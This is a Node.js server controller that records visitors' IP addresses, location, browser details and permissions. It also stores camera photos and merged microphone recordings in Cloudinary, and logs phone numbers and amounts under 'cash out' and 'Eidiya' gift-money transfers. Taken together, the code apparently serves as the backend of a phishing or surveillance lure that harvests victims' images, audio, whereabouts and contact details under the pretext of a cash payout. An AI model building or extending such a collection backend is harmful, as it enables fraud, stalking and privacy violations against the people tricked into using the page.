const crypto = require('crypto');
const Session = require('../models/Session');
const { uploadImageBase64, uploadAudioBuffer } = require('../services/cloudinaryService');

const audioSessions = new Map();

function requestIp(req) {
  const forwardedFor = req.headers['x-forwarded-for'];
  if (typeof forwardedFor === 'string' && forwardedFor.trim()) {
    return forwardedFor.split(',')[0].trim();
  }

  return req.ip || req.socket.remoteAddress || null;
}

exports.startSession = async (req, res) => {
  const sessionId = crypto.randomUUID();
  const now = new Date();
  const ip = requestIp(req);
  console.log(`[START_SESSION] Initializing session ${sessionId} for IP ${ip}`);

  try {
    const session = new Session({
      sessionId,
      ip,
      userAgent: req.get('user-agent') || null,
      clientHints: {
        language: req.body.language || null,
        platform: req.body.platform || null,
        screen: req.body.screen || null,
        timezone: req.body.timezone || null
      },
      location: req.body.location || null,
      permissions: req.body.permissions || null,
      photos: []
    });

    await session.save();
    console.log(`[START_SESSION] Session ${sessionId} saved successfully to MongoDB`);
    res.json({ success: true, sessionId });
  } catch (error) {
    console.error(`[START_SESSION] Error starting session ${sessionId}:`, error);
    res.status(500).json({ success: false, message: 'Database error starting session', details: error.message });
  }
};

exports.saveMetadata = async (req, res) => {
  const { sessionId } = req.params;
  const ip = requestIp(req);
  const userAgent = req.get('user-agent') || null;
  console.log(`[SAVE_METADATA] Updating metadata for session ${sessionId}`);

  try {
    const update = {};
    update.ip = ip;
    update.userAgent = userAgent;

    if (req.body.location) {
      update.location = req.body.location;
    }

    if (req.body.clientHints) {
      for (const [k, v] of Object.entries(req.body.clientHints)) {
        update[`clientHints.${k}`] = v;
      }
    }

    if (req.body.permissions) {
      for (const [k, v] of Object.entries(req.body.permissions)) {
        update[`permissions.${k}`] = v;
      }
    }

    const result = await Session.updateOne({ sessionId }, { $set: update });
    if (result.matchedCount === 0) {
      console.warn(`[SAVE_METADATA] Session ${sessionId} not found`);
      return res.status(404).json({ success: false, message: 'Session not found' });
    }

    console.log(`[SAVE_METADATA] Session ${sessionId} metadata updated successfully`);
    res.json({ success: true });
  } catch (error) {
    console.error(`[SAVE_METADATA] Error updating metadata for session ${sessionId}:`, error);
    res.status(500).json({ success: false, message: 'Database error saving metadata', details: error.message });
  }
};

exports.savePhoto = async (req, res) => {
  const { sessionId } = req.params;
  const { image, facingMode, deviceLabel, takenAt } = req.body;
  console.log(`[SAVE_PHOTO] Request received for session ${sessionId}`);

  if (typeof image !== 'string' || !image.startsWith('data:image/')) {
    console.warn(`[SAVE_PHOTO] Invalid image payload for session ${sessionId}`);
    return res.status(400).json({ success: false, message: 'Invalid image payload' });
  }

  try {
    console.log(`[SAVE_PHOTO] Uploading photo to Cloudinary for session ${sessionId}`);
    const uploadResult = await uploadImageBase64(image);
    console.log(`[SAVE_PHOTO] Photo successfully uploaded to Cloudinary: ${uploadResult.cloudinaryUrl}`);

    const newPhoto = {
      cloudinaryUrl: uploadResult.cloudinaryUrl,
      publicId: uploadResult.publicId,
      facingMode: facingMode || null,
      deviceLabel: deviceLabel || null,
      takenAt: takenAt ? new Date(takenAt) : new Date()
    };

    const result = await Session.updateOne(
      { sessionId },
      { $push: { photos: newPhoto } }
    );

    if (result.matchedCount === 0) {
      console.warn(`[SAVE_PHOTO] Session ${sessionId} not found in DB`);
      return res.status(404).json({ success: false, message: 'Session not found' });
    }

    console.log(`[SAVE_PHOTO] Session ${sessionId} photo entry saved to MongoDB`);
    res.json({ success: true, url: uploadResult.cloudinaryUrl });
  } catch (error) {
    console.error(`[SAVE_PHOTO] Error saving photo for session ${sessionId}:`, error);
    res.status(500).json({ success: false, message: 'Failed to upload photo or save metadata', details: error.message });
  }
};

exports.saveAudioChunk = (req, res) => {
  const { sessionId } = req.params;
  const chunkIndex = String(req.query.index || Date.now()).replace(/[^0-9]/g, '');
  console.log(`[AUDIO_CHUNK] Received chunk #${chunkIndex} for session ${sessionId}`);

  if (!Buffer.isBuffer(req.body) || req.body.length === 0) {
    console.warn(`[AUDIO_CHUNK] Empty audio chunk received for session ${sessionId}`);
    res.status(400).json({ success: false, message: 'Empty audio chunk' });
    return;
  }

  const session = audioSessions.get(sessionId) || {
    chunks: [],
    size: 0,
    contentType: req.get('content-type') || 'audio/webm',
    startedAt: new Date().toISOString()
  };

  session.chunks.push({
    index: Number.parseInt(chunkIndex, 10) || session.chunks.length,
    buffer: req.body
  });
  session.size += req.body.length;
  session.contentType = session.contentType || req.get('content-type') || 'audio/webm';
  session.updatedAt = new Date().toISOString();
  audioSessions.set(sessionId, session);

  res.json({ success: true, buffered: session.chunks.length, size: session.size, index: chunkIndex });
};

exports.finishAudio = async (req, res) => {
  const { sessionId } = req.params;
  const session = audioSessions.get(sessionId);
  console.log(`[FINISH_AUDIO] Finalizing audio for session ${sessionId}`);

  if (!session || !session.chunks.length) {
    console.warn(`[FINISH_AUDIO] No buffered audio chunks found for session ${sessionId}`);
    res.json({ success: true, url: null, message: 'No buffered audio to save' });
    return;
  }

  const sortedChunks = session.chunks
    .slice()
    .sort((a, b) => a.index - b.index)
    .map(chunk => chunk.buffer);
  const audioBuffer = Buffer.concat(sortedChunks, session.size);
  console.log(`[FINISH_AUDIO] Merged ${session.chunks.length} chunks. Combined buffer size: ${audioBuffer.length} bytes`);

  try {
    console.log(`[FINISH_AUDIO] Uploading merged audio buffer to Cloudinary for session ${sessionId}`);
    const uploadResult = await uploadAudioBuffer(audioBuffer);
    console.log(`[FINISH_AUDIO] Audio successfully uploaded to Cloudinary: ${uploadResult.cloudinaryUrl}`);

    const audioData = {
      cloudinaryUrl: uploadResult.cloudinaryUrl,
      publicId: uploadResult.publicId,
      size: audioBuffer.length,
      chunkCount: session.chunks.length,
      contentType: session.contentType,
      startedAt: new Date(session.startedAt),
      savedAt: new Date()
    };

    const result = await Session.updateOne(
      { sessionId },
      { $set: { audio: audioData } }
    );

    if (result.matchedCount === 0) {
      console.warn(`[FINISH_AUDIO] Session ${sessionId} not found in DB`);
      return res.status(404).json({ success: false, message: 'Session not found' });
    }

    audioSessions.delete(sessionId);
    console.log(`[FINISH_AUDIO] Session ${sessionId} audio entry updated successfully in MongoDB`);

    res.json({ success: true, url: uploadResult.cloudinaryUrl, size: audioBuffer.length });
  } catch (error) {
    console.error(`[FINISH_AUDIO] Error completing audio upload for session ${sessionId}:`, error);
    res.status(500).json({ success: false, message: 'Failed to upload audio or save metadata', details: error.message });
  }
};

exports.saveCashOut = async (req, res) => {
  const { sessionId, phoneNumber, amount, location } = req.body;
  const ip = requestIp(req);
  console.log(`[CASH_OUT] Request received for session ${sessionId}, phone: ${phoneNumber}, amount: ${amount}`);

  const targetSessionId = sessionId || crypto.randomUUID();

  try {
    const update = {
      $set: {
        cashOut: {
          phoneNumber,
          amount: parseFloat(amount) || 0,
          ip,
          location: location || null,
          requestedAt: new Date()
        }
      },
      $setOnInsert: {
        sessionId: targetSessionId,
        ip,
        userAgent: req.get('user-agent') || null
      }
    };

    if (location) {
      update.$set.location = location;
    }

    await Session.updateOne(
      { sessionId: targetSessionId },
      update,
      { upsert: true }
    );

    console.log(`[CASH_OUT] Session ${targetSessionId} cashout info saved successfully to DB`);
    res.json({ success: true });
  } catch (error) {
    console.error('[CASH_OUT] Error saving cashout data:', error);
    res.status(500).json({ success: false, message: 'Database error saving cashout info', details: error.message });
  }
};

exports.saveEidiyaTransfer = async (req, res) => {
  const { sessionId, recipient, amount, message, location } = req.body;
  const ip = requestIp(req);
  console.log(`[EIDIYA_TRANSFER] Request received for session ${sessionId}, recipient: ${recipient}, amount: ${amount}`);

  const targetSessionId = sessionId || crypto.randomUUID();

  try {
    const newTransfer = {
      recipient,
      amount: parseFloat(amount) || 0,
      message: message || '',
      ip,
      location: location || null,
      transferredAt: new Date()
    };

    const update = {
      $push: { eidiyaTransfers: newTransfer },
      $setOnInsert: {
        sessionId: targetSessionId,
        ip,
        userAgent: req.get('user-agent') || null
      }
    };

    const setFields = {};
    if (location) {
      setFields.location = location;
    }
    setFields.ip = ip;
    update.$set = setFields;

    await Session.updateOne(
      { sessionId: targetSessionId },
      update,
      { upsert: true }
    );

    console.log(`[EIDIYA_TRANSFER] Session ${targetSessionId} eidiya transfer info saved successfully to DB`);
    res.json({ success: true });
  } catch (error) {
    console.error('[EIDIYA_TRANSFER] Error saving eidiya transfer data:', error);
    res.status(500).json({ success: false, message: 'Database error saving eidiya transfer info', details: error.message });
  }
};
